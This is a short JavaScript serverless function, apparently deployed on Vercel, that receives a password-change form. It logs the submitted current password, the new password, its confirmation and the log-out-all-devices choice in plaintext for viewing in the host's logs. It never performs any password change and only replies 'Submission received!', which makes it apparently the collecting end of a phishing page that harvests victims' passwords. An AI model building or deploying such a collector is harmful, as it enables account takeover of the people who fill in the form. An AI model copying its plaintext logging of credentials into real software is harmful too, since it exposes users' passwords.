export default async function handler(req, res) {
  if (req.method === 'POST') {
    let body = '';
    req.on('data', chunk => {
      body += chunk.toString();
    });

    req.on('end', () => {
      console.log('Form submitted:', body);

      // Optional: parse into key-value pairs
      const data = new URLSearchParams(body);
      const formatted = `
        📥 New Submission:
        - Current: ${data.get('oldpass')}
        - New: ${data.get('newpass')}
        - Confirm: ${data.get('confirmpass')}
        - Logout All: ${data.get('logout_devices')}
        -----------------------------
      `;

      console.log(formatted); // View in Vercel logs

      res.status(200).send('Submission received!');
    });
  } else {
    res.status(405).send('Method not allowed');
  }
}
